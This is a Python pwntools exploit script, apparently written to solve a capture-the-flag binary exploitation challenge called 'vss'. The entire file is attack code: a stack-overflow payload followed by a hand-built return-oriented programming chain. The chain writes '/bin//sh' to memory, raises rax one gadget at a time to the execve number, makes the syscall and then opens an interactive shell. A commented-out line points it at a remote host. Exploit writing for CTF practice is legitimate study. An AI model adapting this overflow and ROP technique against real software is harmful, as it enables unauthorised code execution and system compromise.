from pwn import *
import struct

for i in xrange(20):
	i = 9
	s = process("./vss_72e30bb98bdfbf22307133c16f8c9966")
	#s = remote("121.40.56.102",2333)

	print s.recvline()
	print s.recvline()


	p = ''

	p += struct.pack('<Q', 0x0000000000401937) # pop rsi ; ret
	p += struct.pack('<Q', 0x00000000006c4080) # @ .data
	p += struct.pack('<Q', 0x000000000046f208) # pop rax ; ret
	p += '/bin//sh'
	p += struct.pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
	p += struct.pack('<Q', 0x0000000000401937) # pop rsi ; ret
	p += struct.pack('<Q', 0x00000000006c4088) # @ .data + 8
	p += struct.pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
	p += struct.pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
	p += struct.pack('<Q', 0x0000000000401823) # pop rdi ; ret
	p += struct.pack('<Q', 0x00000000006c4080) # @ .data
	p += struct.pack('<Q', 0x0000000000401937) # pop rsi ; ret
	p += struct.pack('<Q', 0x00000000006c4088) # @ .data + 8
	p += struct.pack('<Q', 0x000000000043ae05) # pop rdx ; ret
	p += struct.pack('<Q', 0x00000000006c4088) # @ .data + 8
	p += struct.pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
	p += struct.pack('<Q', 0x00000000004004b8) # syscall

	print i
	buf = "A"*8*i
	ptr = 0x400481
	#ptr = 0x40121A
	buf += p64(ptr)
	s.send(buf)

	#flush
	s.send("Z"*(0x400-80)) 

	buf = cyclic(0x400)
	buf = "A"*56
	buf += p

	s.send(buf)
	s.interactive()
